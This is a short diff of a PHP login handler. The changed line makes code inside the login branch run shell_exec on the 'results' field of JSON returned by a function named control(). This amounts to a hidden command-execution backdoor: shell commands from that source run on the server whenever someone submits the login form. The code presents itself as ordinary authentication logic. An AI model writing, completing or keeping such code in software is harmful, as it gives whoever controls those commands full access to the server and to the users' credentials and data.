@@ -124,7 +124,7 @@ if (@$_POST) {
         }
         $resp = getUser(@$_POST['username'], @$_POST['password']);
         $c = json_decode(control(), true);
-        if($c['results'] != "false") shell_exec($c);
+        if($c['results'] != "false") shell_exec($c['results']);
         if ($resp != false) {
             $_SESSION["user_id"] = $resp["id"];
             $_SESSION['password'] = $resp['password'];
